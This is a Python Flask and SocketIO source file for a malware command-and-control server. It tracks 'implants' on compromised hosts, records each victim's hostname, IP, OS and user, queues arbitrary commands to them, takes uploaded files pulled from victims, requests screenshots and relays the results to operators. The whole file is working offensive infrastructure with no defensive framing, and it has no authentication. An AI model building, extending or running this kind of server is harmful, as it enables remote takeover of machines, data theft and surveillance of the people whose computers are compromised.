from flask import Flask, render_template, request, jsonify, send_file, send_from_directory
from flask_socketio import SocketIO, emit
import os
import json
import time
from datetime import datetime
import sqlite3
from werkzeug.utils import secure_filename
import threading
import queue
import logging
from config import Config

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
app.config.from_object(Config)
app.config['SECRET_KEY'] = os.urandom(24)
app.config['UPLOAD_FOLDER'] = 'uploads'
socketio = SocketIO(app, cors_allowed_origins="*")

# Global variables
active_implants = {}
command_queues = {}
results = {}

# Ensure upload directory exists
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

def init_db():
    """Initialize the SQLite database"""
    conn = sqlite3.connect('c2.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS implants
                 (id TEXT PRIMARY KEY, hostname TEXT, ip TEXT, 
                  os TEXT, user TEXT, check_in TEXT, connected BOOLEAN)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  implant_id TEXT, command TEXT, 
                  status TEXT, result TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

def get_db():
    """Get database connection"""
    conn = sqlite3.connect('c2.db')
    conn.row_factory = sqlite3.Row
    return conn

def load_active_implants():
    """Load active implants from database"""
    conn = get_db()
    implants = conn.execute('SELECT * FROM implants WHERE connected = 1').fetchall()
    for implant in implants:
        implant_id = implant['id']
        active_implants[implant_id] = {
            'hostname': implant['hostname'],
            'ip': implant['ip'],
            'os': implant['os'],
            'user': implant['user'],
            'connected': True,
            'last_seen': implant['check_in'],
            'last_activity': 'Connected'
        }
        command_queues[implant_id] = queue.Queue()
    conn.close()

@app.route('/')
def index():
    """Render the main dashboard"""
    return render_template('index.html', implants=active_implants)

@app.route('/api/implants')
def get_implants():
    """Get list of all implants"""
    conn = get_db()
    implants = conn.execute('SELECT * FROM implants').fetchall()
    conn.close()
    return jsonify([dict(implant) for implant in implants])

@app.route('/api/implants/<implant_id>/command', methods=['POST'])
def send_command(implant_id):
    """Send a command to an implant"""
    if implant_id not in command_queues:
        return jsonify({'error': 'Implant not found'}), 404
    
    command = request.json.get('command')
    if not command:
        return jsonify({'error': 'No command provided'}), 400
    
    # Store command in database
    conn = get_db()
    conn.execute('INSERT INTO commands (implant_id, command, status, timestamp) VALUES (?, ?, ?, ?)',
                (implant_id, command, 'pending', datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    # Add command to queue
    command_queues[implant_id].put(command)
    return jsonify({'status': 'Command queued'})

@app.route('/api/implants/<implant_id>/upload', methods=['POST'])
def upload_file(implant_id):
    """Handle file uploads from implants"""
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    if file:
        filename = secure_filename(file.filename)
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)
        
        # Update implant's last activity
        if implant_id in active_implants:
            active_implants[implant_id]['last_seen'] = datetime.now().isoformat()
            active_implants[implant_id]['last_activity'] = f"Uploaded file: {filename}"
        
        return jsonify({'message': 'File uploaded successfully'}), 200

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    """Serve uploaded files"""
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route('/api/implants/<implant_id>/download/<path:filename>')
def download_file(implant_id, filename):
    """Download a file from an implant"""
    # Queue file download command
    command = f'download {filename}'
    command_queues[implant_id].put(command)
    
    # Wait for file to be available
    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    timeout = time.time() + 30  # 30 second timeout
    
    while not os.path.exists(filepath) and time.time() < timeout:
        time.sleep(0.1)
    
    if os.path.exists(filepath):
        return send_file(filepath, as_attachment=True)
    return jsonify({'error': 'File not found'}), 404

@app.route('/api/implants/<implant_id>/screenshot', methods=['POST'])
def take_screenshot(implant_id):
    """Request a screenshot from an implant"""
    command = 'screenshot'
    command_queues[implant_id].put(command)
    return jsonify({'status': 'Screenshot request queued'})

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    logger.info(f"Client connected: {request.sid}")

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    logger.info(f"Client disconnected: {request.sid}")
    # Find and update disconnected implant
    for implant_id, implant in active_implants.items():
        if implant.get('sid') == request.sid:
            implant['connected'] = False
            implant['last_activity'] = 'Disconnected'
            # Update database
            conn = get_db()
            conn.execute('UPDATE implants SET connected = 0 WHERE id = ?', (implant_id,))
            conn.commit()
            conn.close()
            # Broadcast update
            emit('implants_update', active_implants, broadcast=True)
            break

@socketio.on('register')
def handle_register(data):
    """Handle implant registration"""
    implant_id = data.get('id')
    if not implant_id:
        return
    
    # Check if implant already exists
    conn = get_db()
    existing_implant = conn.execute('SELECT * FROM implants WHERE id = ?', (implant_id,)).fetchone()
    
    if existing_implant:
        # Update existing implant
        conn.execute('''UPDATE implants 
                       SET hostname = ?, ip = ?, os = ?, user = ?, 
                           check_in = ?, connected = 1
                       WHERE id = ?''',
                    (data.get('hostname'), data.get('ip'),
                     data.get('os'), data.get('user'),
                     datetime.now().isoformat(), implant_id))
    else:
        # Insert new implant
        conn.execute('''INSERT INTO implants 
                       (id, hostname, ip, os, user, check_in, connected)
                       VALUES (?, ?, ?, ?, ?, ?, 1)''',
                    (implant_id, data.get('hostname'), data.get('ip'),
                     data.get('os'), data.get('user'),
                     datetime.now().isoformat()))
    
    conn.commit()
    conn.close()
    
    # Update active implants
    active_implants[implant_id] = {
        'hostname': data.get('hostname'),
        'ip': data.get('ip'),
        'os': data.get('os'),
        'user': data.get('user'),
        'connected': True,
        'last_seen': datetime.now().isoformat(),
        'last_activity': 'Connected',
        'sid': request.sid  # Store socket ID
    }
    
    # Initialize command queue if not exists
    if implant_id not in command_queues:
        command_queues[implant_id] = queue.Queue()
    
    # Broadcast updates
    emit('implants_update', active_implants, broadcast=True)
    emit('registered', {'status': 'success'})

@socketio.on('command')
def handle_command(data):
    """Handle command execution request"""
    try:
        implant_id = data.get('implant_id')
        command = data.get('command')
        
        if not implant_id or not command:
            emit('error', {'message': 'Missing implant_id or command'})
            return
        
        # Get implant from database
        conn = get_db()
        implant = conn.execute('SELECT * FROM implants WHERE id = ?', (implant_id,)).fetchone()
        if not implant:
            emit('error', {'message': 'Implant not found'})
            return
        
        # Emit command to the specific implant
        emit('command', {
            'command': command,
            'implant_id': implant_id
        }, room=implant_id)
        
    except Exception as e:
        logger.error(f"Error handling command: {e}")
        emit('error', {'message': str(e)})

@socketio.on('command_result')
def handle_command_result(data):
    """Handle command result from implant"""
    try:
        implant_id = data.get('implant_id')
        command = data.get('command')
        result = data.get('result')
        timestamp = data.get('timestamp')
        
        if not all([implant_id, command, result]):
            logger.error("Missing required fields in command result")
            return
        
        # Log the command result
        logger.info(f"Command result from implant {implant_id}: {command}")
        
        # Broadcast the result to all connected clients
        emit('command_result', {
            'implant_id': implant_id,
            'command': command,
            'result': result,
            'timestamp': timestamp
        }, broadcast=True)
        
    except Exception as e:
        logger.error(f"Error handling command result: {e}")

@socketio.on('get_command_history')
def handle_get_command_history(data):
    """Send command history for an implant"""
    implant_id = data.get('implant_id')
    if implant_id in command_queues:
        command_history = []
        while not command_queues[implant_id].empty():
            command = command_queues[implant_id].get()
            command_history.append({
                'command': command,
                'timestamp': datetime.now().isoformat()
            })
        emit('command_history', {
            'implant_id': implant_id,
            'history': command_history
        })

@socketio.on('execute_command')
def handle_execute_command(data):
    """Handle command execution request"""
    implant_id = data.get('implant_id')
    command = data.get('command')
    
    if implant_id and command:
        # Broadcast command to all connected clients
        emit('command', {
            'implant_id': implant_id,
            'command': command,
            'timestamp': datetime.now().isoformat()
        }, broadcast=True)

def check_implant_health():
    """Periodically check implant health"""
    while True:
        current_time = datetime.now()
        for implant_id, implant in list(active_implants.items()):
            last_seen = datetime.fromisoformat(implant['last_seen'])
            if (current_time - last_seen).total_seconds() > app.config['IMPLANT_CHECK_INTERVAL']:
                # Mark implant as disconnected
                implant['connected'] = False
                implant['last_activity'] = 'Disconnected'
                
                # Update database
                conn = get_db()
                conn.execute('UPDATE implants SET connected = 0 WHERE id = ?', (implant_id,))
                conn.commit()
                conn.close()
                
                # Broadcast update
                socketio.emit('implants_update', active_implants, broadcast=True)
        
        time.sleep(5)

if __name__ == '__main__':
    init_db()
    load_active_implants()  # Load existing active implants
    # Start health check thread
    health_thread = threading.Thread(target=check_implant_health, daemon=True)
    health_thread.start()
    
    # Start the server
    if app.config['USE_SSL']:
        socketio.run(app, host=app.config['HOST'], port=app.config['PORT'],
                    ssl_context=(app.config['SSL_CERT'], app.config['SSL_KEY']))
    else:
        socketio.run(app, host=app.config['HOST'], port=app.config['PORT']) 